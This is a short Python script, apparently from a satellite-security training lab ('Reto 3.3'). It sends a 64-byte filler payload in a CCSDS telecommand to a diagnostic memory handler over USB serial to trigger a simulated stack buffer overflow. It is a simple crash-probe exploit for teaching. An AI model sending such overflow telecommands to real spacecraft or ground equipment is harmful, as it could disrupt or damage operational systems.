#!/usr/bin/env python3
"""
Reto 3.3: Stack Buffer Overflow (USB Variant)
Sends an oversized payload (> 32 bytes) to APID 0x31 (DIAG_MEM) over USB serial.
"""
import os
import sys

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../lib")))
from flatsat_usb import FlatSatUSB
from pwnsat_packets import build_ccsds_packet

def main():
    print("[+] Reto 3.3: Stack Buffer Overflow Scan Probe (USB Serial Variant)")
    usb = FlatSatUSB()
    
    # Payload > 32 bytes to trigger simulated stack buffer overflow (DIAG_MEM / APID 0x31)
    overflow_payload = b"A" * 64
    pkt = build_ccsds_packet(apid=0x31, payload=overflow_payload)
    
    print(f"[*] Sending 64-byte payload to APID 0x31 (DIAG_MEM)...")
    if usb.send_raw(pkt):
        print("[✓] Stack Buffer Overflow telecommand frame sent over USB.")
    else:
        print("[X] Failed to send telecommand over USB.")
    usb.close()

if __name__ == "__main__":
    main()
